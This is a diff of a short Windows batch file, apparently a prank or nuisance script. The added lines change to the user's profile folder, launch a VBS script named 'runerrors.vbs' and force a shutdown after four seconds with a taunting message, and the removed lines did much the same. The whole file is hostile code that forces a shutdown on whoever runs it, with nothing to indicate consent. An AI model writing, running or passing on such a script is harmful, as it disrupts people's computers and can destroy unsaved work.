@@ -1,5 +1,8 @@
 @echo off
 
+cd %userprofile%
 
-shutdown -s -t 4 -c " Dont even try to reboot LMAO"
-start errors.bat
+start runerrors.vbs
+
+shutdown -s -t 4 -c " Dont even try to reboot LMAOOOOO"
+
